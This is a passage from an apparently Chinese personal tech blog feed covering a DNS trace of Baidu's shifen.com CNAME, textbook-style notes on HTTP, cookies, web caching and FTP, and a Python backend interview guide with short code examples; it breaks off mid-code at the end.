<p>从这里可以看出来<code>shifen.com</code>和<code>baidu.com</code>的域名服务器是同一台，当拿到别名<code>www.a.shifen.com</code>的时候，本来要重新到com域查找<code>shifen.com</code>的NS，又因为两个域在同一台NS上，所以直接本机发起了<code>shifen.com</code>请求，发现<code>www.a.shifen.com</code>是属于<code>a.shifen.com</code>这个域的，所以直接访问<code>shifen.com</code>所返回的IP地址，结果是<code>403 Forbidden</code>，所以应该去到<code>a.shifen.com</code>这个域获取，于是把<code>a.shifen.com</code>这个NS和IP返回，然后在<code>a.shifen.com</code>这个域的域名服务器上查询<code>www.a.shifen.com</code>，如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div></pre></td><td class="code"><pre><div class="line">kevin@duguangtingdeMacBook-Pro:~/Desktop/work/capacity $ dig www.a.shifen.com +trace</div><div class="line"># 根dns服务器</div><div class="line">; &lt;&lt;&gt;&gt; DiG 9.8.3-P1 &lt;&lt;&gt;&gt; www.a.shifen.com +trace</div><div class="line">;; global options: +cmd</div><div class="line">.			174188	IN	NS	a.root-servers.net.</div><div class="line">.			174188	IN	NS	b.root-servers.net.</div><div class="line">.			174188	IN	NS	h.root-servers.net.</div><div class="line">.			174188	IN	NS	d.root-servers.net.</div><div class="line">.			174188	IN	NS	g.root-servers.net.</div><div class="line">.			174188	IN	NS	l.root-servers.net.</div><div class="line">.			174188	IN	NS	m.root-servers.net.</div><div class="line">.			174188	IN	NS	f.root-servers.net.</div><div class="line">.			174188	IN	NS	j.root-servers.net.</div><div class="line">.			174188	IN	NS	c.root-servers.net.</div><div class="line">.			174188	IN	NS	i.root-servers.net.</div><div class="line">.			174188	IN	NS	e.root-servers.net.</div><div class="line">.			174188	IN	NS	k.root-servers.net.</div><div class="line">;; Received 228 bytes from 119.29.29.29#53(119.29.29.29) in 39 ms</div><div class="line"># com域</div><div class="line">com.			172800	IN	NS	c.gtld-servers.net.</div><div class="line">com.			172800	IN	NS	d.gtld-servers.net.</div><div class="line">com.			172800	IN	NS	m.gtld-servers.net.</div><div class="line">com.			172800	IN	NS	j.gtld-servers.net.</div><div class="line">com.			172800	IN	NS	f.gtld-servers.net.</div><div class="line">com.			172800	IN	NS	e.gtld-servers.net.</div><div class="line">com.			172800	IN	NS	b.gtld-servers.net.</div><div class="line">com.			172800	IN	NS	h.gtld-servers.net.</div><div class="line">com.			172800	IN	NS	a.gtld-servers.net.</div><div class="line">com.			172800	IN	NS	k.gtld-servers.net.</div><div class="line">com.			172800	IN	NS	i.gtld-servers.net.</div><div class="line">com.			172800	IN	NS	l.gtld-servers.net.</div><div class="line">com.			172800	IN	NS	g.gtld-servers.net.</div><div class="line">;; Received 494 bytes from 192.203.230.10#53(192.203.230.10) in 523 ms</div><div class="line"># 先查的是shifen.com</div><div class="line">shifen.com.		172800	IN	NS	dns.baidu.com.</div><div class="line">shifen.com.		172800	IN	NS	ns2.baidu.com.</div><div class="line">shifen.com.		172800	IN	NS	ns3.baidu.com.</div><div class="line">shifen.com.		172800	IN	NS	ns4.baidu.com.</div><div class="line">;; Received 176 bytes from 192.33.14.30#53(192.33.14.30) in 27 ms</div><div class="line"># 发现是属于 a.shifen.com这个域的</div><div class="line">a.shifen.com.		1200	IN	NS	ns5.a.shifen.com.</div><div class="line">a.shifen.com.		1200	IN	NS	ns4.a.shifen.com.</div><div class="line">a.shifen.com.		1200	IN	NS	ns2.a.shifen.com.</div><div class="line">a.shifen.com.		1200	IN	NS	ns1.a.shifen.com.</div><div class="line">a.shifen.com.		1200	IN	NS	ns3.a.shifen.com.</div><div class="line">;; Received 204 bytes from 61.135.165.235#53(61.135.165.235) in 82 ms</div><div class="line"># 在a.shifen.com这个域上查找</div><div class="line">www.a.shifen.com.	300	IN	A	61.135.169.125</div><div class="line">www.a.shifen.com.	300	IN	A	61.135.169.121</div><div class="line">a.shifen.com.		1200	IN	NS	ns3.a.shifen.com.</div><div class="line">a.shifen.com.		1200	IN	NS	ns4.a.shifen.com.</div><div class="line">a.shifen.com.		1200	IN	NS	ns5.a.shifen.com.</div><div class="line">a.shifen.com.		1200	IN	NS	ns1.a.shifen.com.</div><div class="line">a.shifen.com.		1200	IN	NS	ns2.a.shifen.com.</div><div class="line">;; Received 236 bytes from 61.135.162.215#53(61.135.162.215) in 38 ms</div></pre></td></tr></table></figure>
<p>直接访问之，正是百度的页面。</p>
<h1 id="彩蛋-shifen-com由来"><a href="#彩蛋-shifen-com由来" class="headerlink" title="彩蛋-shifen.com由来"></a><code>彩蛋-shifen.com由来</code></h1><p><code>http://shifen.com</code>是百度当年为了竞价排名这个广告系统注册的，这个后台系统被命名为Shifen竞价排名，以前的销售系统现在还叫shifen销售系统。因为当年百度那个广告最低点击10分起价。为什么有这么一个奇怪的名字呢？在《相信中国》中，梁冬先生这样写道：“这个将来成就了百度80%收入的商业模式，最初的管理平台是由一个叫刘子正的实习生主持开发的。这也是唯一一个除<code>http://baidu.com</code>以外，外人所知的百度公司所拥有的国际域名。</p>
<p>另外：大公司都跟“十分”有关系啊，比如腾讯——TenCent⋯⋯</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;今天用&lt;code&gt;nslookup&lt;/code&gt;命令解析查看了&lt;code&gt;www.baidu.com&lt;/code&gt;的IP地址，却意外发现百度的&lt;code&gt;CNAME&lt;/code&gt;居然是&lt;code&gt;www.a.shifen.com&lt;/code&gt;&lt;/p&gt;
&lt;h1 id=&quot;解析过
    
    </summary>
    
      <category term="计算机网络" scheme="http://microndgt.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
    
    
      <category term="编程" scheme="http://microndgt.github.io/tags/%E7%BC%96%E7%A8%8B/"/>
    
      <category term="计算机科学" scheme="http://microndgt.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>计算机网络 应用层</title>
    <link href="http://microndgt.github.io/2017/02/19/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E5%BA%94%E7%94%A8%E5%B1%82/"/>
    <id>http://microndgt.github.io/2017/02/19/计算机网络-应用层/</id>
    <published>2017-02-19T03:06:16.000Z</published>
    <updated>2017-02-20T08:52:36.000Z</updated>
    
    <content type="html"><![CDATA[<p>网络应用方面的原理和实现，包括应用程序所需要使用的网络服务，客户和服务器，进程和运输层接口。研发网络应用程序的核心是写出能够运行在不同的端系统和通过网络彼此通信的程序。</p>
<h1 id="应用层协议原理"><a href="#应用层协议原理" class="headerlink" title="应用层协议原理"></a>应用层协议原理</h1><h2 id="网络应用程序体系结构"><a href="#网络应用程序体系结构" class="headerlink" title="网络应用程序体系结构"></a>网络应用程序体系结构</h2><p>网络体系结构是固定的，为应用程序提供了特定的服务集合，应用程序体系结构主要有一下：客户－服务器体系结构或者对等P2P体系结构</p>
<p>客户－服务器体系结构有一个打开的主机作为服务器，服务于来自其他客户的主机请求，客户通过向该服务器的IP地址发送分组来与其联系。</p>
<p>P2P体系结构中，应用程序在间断链接的主机对之间使用直接通信，这些主机对被称为对等方，通信不必经过专门的服务器，在即时讯息应用，服务器被用于跟踪用户的IP地址，用户和用户的报文在用户主机之间直接发送。</p>
<h2 id="进程通信"><a href="#进程通信" class="headerlink" title="进程通信"></a>进程通信</h2><p>进行通信的实际上是进程而不是程序，进程运行在相同的端系统上时，他们使用进程间通信机制相互通信，进程间通信规则由端系统上的操作系统确定。两个不同端系统上的进行，通过跨越计算机网络交换报文而相互通信。</p>
<p>进程通过一个被称为套接字的软件接口向网络发送报文和从网络接收报文。套接字是同一台主机内应用层与运输层之间的接口，由于该套接字是建立网络应用程序的可编程接口，因此套接字也称为应用程序和网络之间的应用程序编程接口。开发者可以控制套接字在应用层端的一切，但是对套接字在运输层端几乎没有控制权。</p>
<p>为了标识接收进程，需要定义两种信息，主机的地址和接收进程标识符。IP地址和目的端口号。</p>
<h2 id="可供应用程序使用的运输服务"><a href="#可供应用程序使用的运输服务" class="headerlink" title="可供应用程序使用的运输服务"></a>可供应用程序使用的运输服务</h2><p>主要有可靠运输服务，吞吐量，定时和安全性。</p>
<p>可靠运输：确保数据交付服务，进程到进程之间的可靠数据传输</p>
<p>吞吐量：发送进程能够向接收进程交付比特的速率，运输层协议能够以某种特定的速率提供确保的可用吞吐量，使用这种服务，应用程序能够请求r比特/s的确保吞吐量</p>
<p>定时：提供定时保证</p>
<p>安全性，运输协议能够为应用程序提供一种或者多种安全性服务。</p>
<h2 id="因特网提供的运输服务"><a href="#因特网提供的运输服务" class="headerlink" title="因特网提供的运输服务"></a>因特网提供的运输服务</h2><p>TCP：包括面向链接的服务和可靠数据传输服务，在应用层数据开始流动之前，TCP让服务器和客户互联，即握手，之后TCP链接就在两个进程的套接字之间建立了，是全双工的，即链接双方的进程可以在此链接上同时进行报文收发。同时其具有拥塞控制机制。</p>
<p>SSL：安全套接字层，是对TCP的加强，这种强化是在应用层上实现的。</p>
<p>UDP：不提供不必要服务的轻量级运输协议，提供最小服务，提供一种不可靠数据传送服务，不保证报文将到达接收进程，到达也可能是乱序到达的，没有拥塞控制机制。</p>
<p>当前互联网能够为时间敏感应用提供服务，但是不能提供定时或者带宽保证。</p>
<h2 id="应用层协议"><a href="#应用层协议" class="headerlink" title="应用层协议"></a>应用层协议</h2><p>定义了运行在不同端系统的应用程序进程如何相互传递报文，定义了</p>
<ul>
<li>交换的报文类型</li>
<li>各种报文类型的语法</li>
<li>字段的语义</li>
<li>一个进程何时以及如何发送报文，对报文进行响应的规则</li>
</ul>
<p>web的应用层协议是HTTP，定义了在浏览器和web服务器之间传输的报文格式和序列</p>
<h1 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h1><h2 id="概况"><a href="#概况" class="headerlink" title="概况"></a>概况</h2><p>超文本传输协议，HTTP，web的核心，HTTP由两个程序实现，一个客户程序，一个服务器程序，客户程序和服务器程序运行在不同的端系统中，通过交换HTTP报文进行会话。</p>
<p>每个URL地址由两部分组成，存放对象的服务器主机名和对象的路径名</p>
<p>web浏览器实现了HTTP的客户端，web服务器实现了HTTP的服务器端，存储web对象，每个对象由URL寻址。</p>
<p>HTTP定义了web客户向web服务器请求web页面的方式，以及服务器向客户传送web页面的方式。HTTP使用TCP作为他的支撑运输协议。</p>
<p>服务器向客户发送被请求的文件，而不存储任何关于该客户的状态信息，所以HTTP是一个无状态协议。</p>
<h2 id="非持续连接和持续连接"><a href="#非持续连接和持续连接" class="headerlink" title="非持续连接和持续连接"></a>非持续连接和持续连接</h2><p>HTTP在其默认方式下使用持续连接，HTTP客户和服务器能够配置成使用非持续连接。每个请求响应对是经一个单独的TCP连接发送，非持续连接。所有请求和响应经过相同的TCP链接发送，持续连接。</p>
<p>往返时间RTT，指一个短分组从客户到服务器然后再返回客户所花费的时间。因此一个TCP连接总的响应时间是两个RTT加上服务传输HTML文件的时间，三次握手及传输。</p>
<p>采用持续连接，服务器在发送响应后保持该TCP连接打开，在相同的客户与服务器之间的后续请求和响应报文能够通过相同的连接进行传送。如果经过一定时间间隔没有使用，HTTP服务器就关闭该链接。</p>
<h2 id="HTTP请求报文"><a href="#HTTP请求报文" class="headerlink" title="HTTP请求报文"></a>HTTP请求报文</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">GET /somedir/sth.html HTTP/1.1</div><div class="line">Host: www.someschool.edu</div><div class="line">Connection: close</div><div class="line">User-agent: Mozilla/5.0</div><div class="line">Accept-language: fr</div></pre></td></tr></table></figure>
<p>每行由一个回车和换行符结束，最后一行再附加一个回车换行符。第一行是请求行，其后继行叫做首部行，对于POST请求，后面还附有实体体。Connection close说明服务器不希望使用持续连接。</p>
<h2 id="HTTP响应报文"><a href="#HTTP响应报文" class="headerlink" title="HTTP响应报文"></a>HTTP响应报文</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">HTTP/1.1 200 OK</div><div class="line">Connection: close</div><div class="line">Date: Tue, 09 Aug 2016 15:44:04 GMT</div><div class="line">Server: Apache/2.2.3 (CentOS)</div><div class="line">Last-Modified:</div><div class="line">Content-Length: 6821</div><div class="line">Content-Type: text/html</div><div class="line"></div><div class="line">(data...)</div></pre></td></tr></table></figure>
<p>初始状态行，首部行和实体体，Date是服务器产生并且发送该响应报文的日期和时间。</p>
<h2 id="用户和服务器的交互：cookie"><a href="#用户和服务器的交互：cookie" class="headerlink" title="用户和服务器的交互：cookie"></a>用户和服务器的交互：cookie</h2><p>HTTP使用cookie允许站点对用户进行跟踪</p>
<p>HTTP响应报文中一个cookie首部行，HTTP请求报文中一个cookie首部行，用户端系统保留有一个cookie文件，并有用户的浏览器进行管理，后端Web站点有一个后端数据库。</p>
<p>cookie用于标识一个用户，用户首次访问一个站点需要一个用户标识，cookie可以在无状态的HTTP上建立了一个用户会话层。</p>
<h2 id="web缓存"><a href="#web缓存" class="headerlink" title="web缓存"></a>web缓存</h2><p>web缓存器也叫做代理服务器，他是能够代表初始web服务器来满足http请求的网络实体，具体内容见书74页。web缓存器既是服务器又是客户，当它接收浏览器的请求并且发回响应的时候是服务器，当它向初始服务器发送请求并且接收响应时候，是一个客户。</p>
<p>web缓存器可以大大减少对客户请求的响应时间，特别是客户与初始服务器之间的瓶颈带宽远低于客户与web缓存器之间的瓶颈带宽时。</p>
<p>通过使用内容分发网络，CDN，web缓存器，CDN公司安装了地理上分散的缓存器，使得大量流量本地化。</p>
<h2 id="条件get方法"><a href="#条件get方法" class="headerlink" title="条件get方法"></a>条件get方法</h2><p>http协议有一种机制，允许缓存器证实它的对象是最新的，就是条件get方法，请求报文使用get方法， 有一个<code>If-Modified-Since</code>首部，其内容是日期，指当指定日期之后该对象被修改过，才发送该对象。作为对条件get方法的响应，web服务器仍然发送一个响应报文，但是没有在响应报文中包含所请求的对象，如果没有修改过的话。<code>304 Not Modified</code>表示缓存器可以使用该对象，能向请求的浏览器转发它缓存的该对象副本。</p>
<h1 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h1><p>FTP与HTTP都是运行在TCP上，FTP用了两个并行的TCP来传输文件，一个是控制链接，一个是数据连接。控制链接用于在两主机上传输控制信息，数据连接用于实际发送文件数据，HTTP是在同一个TCP连接内发送请求和响应的，HTTP是带内发送控制信息的，FTP是带外发送控制信息的。</p>
<p>FTP的客户首先在服务器21号端口发起一个用于控制的TCP连接。对FTP传输而言，控制连接贯穿了整个用户会话期间，但是对会话的每次文件传输都需要建立一个新的数据连接，数据连接是非持续的。</p>
<p>FTP服务器将对每个进行中的用户会话状态信息进行追踪，大大限制了FTP同时维护的会话总数。</p>
<h1 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h1>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;网络应用方面的原理和实现，包括应用程序所需要使用的网络服务，客户和服务器，进程和运输层接口。研发网络应用程序的核心是写出能够运行在不同的端系统和通过网络彼此通信的程序。&lt;/p&gt;
&lt;h1 id=&quot;应用层协议原理&quot;&gt;&lt;a href=&quot;#应用层协议原理&quot; class=&quot;heade
    
    </summary>
    
      <category term="计算机网络" scheme="http://microndgt.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
    
    
      <category term="编程" scheme="http://microndgt.github.io/tags/%E7%BC%96%E7%A8%8B/"/>
    
      <category term="计算机科学" scheme="http://microndgt.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>Python后台开发工程师面试指南</title>
    <link href="http://microndgt.github.io/2017/02/17/Python%E5%90%8E%E5%8F%B0%E5%BC%80%E5%8F%91%E5%B7%A5%E7%A8%8B%E5%B8%88%E9%9D%A2%E8%AF%95%E6%8C%87%E5%8D%97/"/>
    <id>http://microndgt.github.io/2017/02/17/Python后台开发工程师面试指南/</id>
    <published>2017-02-17T09:15:39.000Z</published>
    <updated>2017-02-23T10:12:58.000Z</updated>
    
    <content type="html"><![CDATA[<p>最近两天当了三次面试官，刚开始面试的时候不知道问些什么，后来就形成套路了，基本就是先是Python语法，多线程多进程，然后是数据分析，数据结构与算法，操作系统，Linux，数据库。不过有些问题自己也不知道答案。。。为了防止自己什么时候卡壳，所以总结一下这个面试指南，得指南者得天下。。万一有面试者提前看了这篇文章，那就偷着乐吧，啊哈哈哈哈。</p>
<h1 id="Python篇"><a href="#Python篇" class="headerlink" title="Python篇"></a>Python篇</h1><h2 id="序列倒序"><a href="#序列倒序" class="headerlink" title="序列倒序"></a>序列倒序</h2><p>这个问题是我乐此不疲的问题之一，方法有好多种。。。另外，记住拼写，<code>reverse</code>，好多面试者写错了= =</p>
<ol>
<li><code>a[::-1]</code></li>
<li>对于列表<code>a.reverse()</code>,原地倒序</li>
<li>对于字符串不可变对象，<code>&#39;&#39;.join(list(reversed(a)))</code></li>
</ol>
<h2 id="字典排序"><a href="#字典排序" class="headerlink" title="字典排序"></a>字典排序</h2><p>这个主要有两种常用方法一种套路</p>
<ol>
<li><code>sorted(a.items(), key=lambda x: x[0])</code></li>
<li>使用itemgetter</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">from operator import itemgetter</div><div class="line">sorted(a.items(), key=itemgetter(0))</div></pre></td></tr></table></figure>
<p>对列表字典等结构排序也很容易。</p>
<h2 id="寻找序列中次数最多的元素"><a href="#寻找序列中次数最多的元素" class="headerlink" title="寻找序列中次数最多的元素"></a>寻找序列中次数最多的元素</h2><p>这个问题在leetcode刷题的时候遇到过，当时是用字典手动实现的，但是用<code>collections</code>模块的<code>Counter</code>类更简单</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">from collections import Counter</div><div class="line">word_counts = Counter(word)</div><div class="line">top_three = word_counts.most_common(3)</div></pre></td></tr></table></figure>
<h2 id="闭包"><a href="#闭包" class="headerlink" title="闭包"></a>闭包</h2><p>实现一个简单的闭包，以及阐述其特性</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">def func(name):</div><div class="line">    def inner_func(age):</div><div class="line">        print &apos;name:&apos;, name, &apos;age:&apos;, age</div><div class="line">    return inner_func</div></pre></td></tr></table></figure>
<p>在python中很重要也很常见的一个使用场景就是装饰器，Python为装饰器提供了一个很友好的“语法糖”——<code>@</code>，让我们可以很方便的使用装饰器</p>
<h2 id="生成器"><a href="#生成器" class="headerlink" title="生成器"></a>生成器</h2><p>实现一个简单的生成器函数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">def odd():</div><div class="line">    n = 1</div><div class="line">    while True:</div><div class="line">        yield n</div><div class="line">        n += 2</div><div class="line">odd_num = odd()</div><div class="line">count = 0</div><div class="line">for o in odd_num:</div><div class="line">    if count &gt;= 5: break</div><div class="line">    print(o)</div><div class="line">    count += 1</div></pre></td></tr></table></figure>
<h2 id="静态方法，类方法，实例方法的区别"><a href="#静态方法，类方法，实例方法的区别" class="headerlink" title="静态方法，类方法，实例方法的区别"></a>静态方法，类方法，实例方法的区别</h2><p>实例方法就是类的实例能够使用的方法。</p>
<p>静态方法是一种普通函数，就位于类定义的命名空间中，它不会对任何实例类型进行操作。使用装饰器<code>@staticmethod</code>定义静态方法。</p>
<p>类方法是将类本身作为对象进行操作的方法。类方法使用<code>@classmethod</code>装饰器定义，其第一个参数是类，约定写为<code>cls</code>。类对象和实例都可以调用类方法</p>
<h2 id="Python中有哪几种导入方法"><a href="#Python中有哪几种导入方法" class="headerlink" title="Python中有哪几种导入方法"></a>Python中有哪几种导入方法</h2><ul>
<li><code>import modname</code></li>
<li><code>from modname import a</code></li>
<li>内建函数<code>__import__()</code></li>
</ul>
<h2 id="一个使用上下文管理器的例子"><a href="#一个使用上下文管理器的例子" class="headerlink" title="一个使用上下文管理器的例子"></a>一个使用上下文管理器的例子</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">with open(filename, mode) as writer:</div><div class="line">    writer.write(&quot;hello&quot;)</div><div class="line">    writer.write(&quot;world&quot;)</div></pre></td></tr></table></figure>
<h2 id="property属性"><a href="#property属性" class="headerlink" title="property属性"></a>property属性</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">class Celsius:</div><div class="line">    def __init__(self, temperature = 0):</div><div class="line">        self._temperature = temperature</div><div class="line">    def to_fahrenheit(self):</div><div class="line">        return (self.temperature * 1.8) + 32</div><div class="line">    @property</div><div class="line">    def temperature(self):</div><div class="line">        print(&quot;Getting value&quot;)</div><div class="line">        return self._temperature</div><div class="line">    @temperature.setter</div><div class="line">    def temperature(self, value):</div><div class="line">        if value &lt; -273:</div><div class="line">            raise ValueError(&quot;Temperature below -273 is not possible&quot;)</div><div class="line">        print(&quot;Setting value&quot;)</div><div class="line">        self._temperature = value</div></pre></td></tr></table></figure>
<h2 id="描述器"><a href="#描述器" class="headerlink" title="描述器"></a>描述器</h2><h2 id="简述Python全局锁问题"><a href="#简述Python全局锁问题" class="headerlink" title="简述Python全局锁问题"></a>简述Python全局锁问题</h2><p>线程安全: 在多线程环境中，当各线程不共享数据的时候，那么一定是线程安全的。问题是这种情况并不多见，在多数情况下需要共享数据，这时就需要进行适当的同步控制了。</p>
<p>Python全局锁问题: 解释器的C语言实现部分在完全并行执行时并不是线程安全的。怪不得需要全局解释器锁保护，确保任何时候都只有一个Python线程执行。 程序大部分只会设计到I/O，比如网络交互，那么使用多线程就很合适， 因为它们大部分时间都在等待。</p>
<h1 id="计算机网络"><a href="#计算机网络" class="headerlink" title="计算机网络"></a>计算机网络</h1><h2 id="因特网的协议栈由哪几个层次组成？"><a href="#因特网的协议栈由哪几个层次组成？" class="headerlink" title="因特网的协议栈由哪几个层次组成？"></a>因特网的协议栈由哪几个层次组成？</h2><ul>
<li>应用层</li>
<li>运输层</li>
<li>网络层</li>
<li>链路层</li>
<li>物理层</li>
</ul>
<h2 id="运输层有哪两种主要的协议，有什么特点"><a href="#运输层有哪两种主要的协议，有什么特点" class="headerlink" title="运输层有哪两种主要的协议，有什么特点."></a>运输层有哪两种主要的协议，有什么特点.</h2><ul>
<li><p>TCP：包括面向链接的服务和可靠数据传输服务，在应用层数据开始流动之前，TCP让服务器和客户互联，即握手，之后TCP链接就在两个进程的套接字之间建立了，是全双工的，即链接双方的进程可以在此链接上同时进行报文收发。同时其具有拥塞控制机制。</p>
</li>
<li><p>UDP：不提供不必要服务的轻量级运输协议，提供最小服务，提供一种不可靠数据传送服务，不保证报文将到达接收进程，到达也可能是乱序到达的，没有拥塞控制机制。</p>
</li>
</ul>
<h2 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h2><p>HTTP由两个程序实现，一个客户程序，一个服务器程序，客户程序和服务器程序运行在不同的端系统中，通过交换HTTP报文进行会话。</p>
<h2 id="简述web缓存器（代理服务器）的作用和特点。"><a href="#简述web缓存器（代理服务器）的作用和特点。" class="headerlink" title="简述web缓存器（代理服务器）的作用和特点。"></a>简述web缓存器（代理服务器）的作用和特点。</h2><p>web缓存器也叫做代理服务器，他是能够代表初始web服务器来满足http请求的网络实体。web缓存器既是服务器又是客户，当它接收浏览器的请求并且发回响应的时候是服务器，当它向初始服务器发送请求并且接收响应时候，是一个客户。</p>
<p>web缓存器可以大大减少对客户请求的响应时间，特别是客户与初始服务器之间的瓶颈带宽远低于客户与web缓存器之间的瓶颈带宽时。</p>
<h1 id="版本控制"><a href="#版本控制" class="headerlink" title="版本控制"></a>版本控制</h1><h2 id="分支"><a href="#分支" class="headerlink" title="分支"></a>分支</h2><p>分支的原理</p>
<h1 id="Flask"><a href="#Flask" class="headerlink" title="Flask"></a>Flask</h1><h2 id="REST表现层状态迁移"><a href="#REST表现层状态迁移" class="headerlink" title="REST表现层状态迁移"></a>REST表现层状态迁移</h2><p>如何理解web service</p>
<h1 id="设计模式"><a href="#设计模式" class="headerlink" title="设计模式"></a>设计模式</h1><h2 id="工厂模式"><a href="#工厂模式" class="headerlink" title="工厂模式"></a>工厂模式</h2><h2 id="单例"><a href="#单例" class="headerlink" title="单例"></a>单例</h2><h1 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h1><h1 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h1><h2 id="操作系统的本质是什么？"><a href="#操作系统的本质是什么？" class="headerlink" title="操作系统的本质是什么？"></a>操作系统的本质是什么？</h2><p>对计算机资源的调度</p>
<h2 id="进程和线程区别"><a href="#进程和线程区别" class="headerlink" title="进程和线程区别"></a>进程和线程区别</h2><p>进程，是并发执行的程序在执行过程中分配和管理资源的基本单位，是一个动态概念，竟争计算机系统资源的基本单位。</p>
<p>线程，在网络或多用户环境下，一个服务器通常需要接收大量且不确定数量用户的并发请求，为每一个请求都创建一个进程显然是行不通的，无论是从系统资源开销方面或是响应用户请求的效率方面来看。因此，操作系统中线程的概念便被引进了。线程，是进程的一部分，一个没有线程的进程可以被看作是单线程的。线程有时又被称为轻权进程或轻量级进程，也是 CPU 调度的一个基本单位。</p>
<h2 id="内存管理"><a href="#内存管理" class="headerlink" title="内存管理"></a>内存管理</h2><h1 id="数据结构与算法"><a href="#数据结构与算法" class="headerlink" title="数据结构与算法"></a>数据结构与算法</h1><h2 id="Reverse-a-singly-linked-list"><a href="#Reverse-a-singly-linked-list" class="headerlink" title="Reverse a singly linked list."></a>Reverse a singly linked list.</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"># Definition for singly-linked list.</div><div class="line"># class ListNode(object):</div><div class="line">#     def __init__(self, x):</div><div class="line">#         self.val = x</div><div class="line">#         self.next = None</div><div class="line"></div><div class="line">class Solution(object):</div><div class="line">    def reverseList(self, head):</div><div class="line">        &quot;&quot;&quot;</div><div class="line">        :type head: ListNode</div><div class="line">        :rtype: ListNode</div><div class="line">        &quot;&quot;&quot;</div></pre></td></tr></table></figure>
<h2 id="Same-Tree"><a href="#Same-Tree" class="headerlink" title="Same Tree"></a>Same Tree</h2><p>Given two binary trees, write a function to check if they are equal or not.<br>Two binary trees are considered equal if they are structurally identical and the nodes have the same value.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"># Definition for a binary tree node.</div><div class="line"># class TreeNode(object):</div><div class="line">#     def __init__(self, x):</div><div class="line">#         self.val = x</div><div class="line">#         self.left = None</div><div class="line">#         self.right = None</div><div class="line">class Solution(object):</div><div class="line">    def isSameTree(self, p, q):</div><div class="line">        &quot;&quot;&quot;</div><div class="line">        :type p: TreeNode</div><div class="line">        :type q: TreeNode</div><div class="line">        :rtype: bool</div><div class="line">        &quot;&quot;&quot;</div><div class="line">        #判断结构和值，并且注意空节点的判断</div><div class="line">        if p is None and q is None:</div><div class="line">            return True</div><div class="line">        elif p is None or q is None:</div><div class="line">            return False</div><div class="line">        else:</div><div class="line">            if p.val == 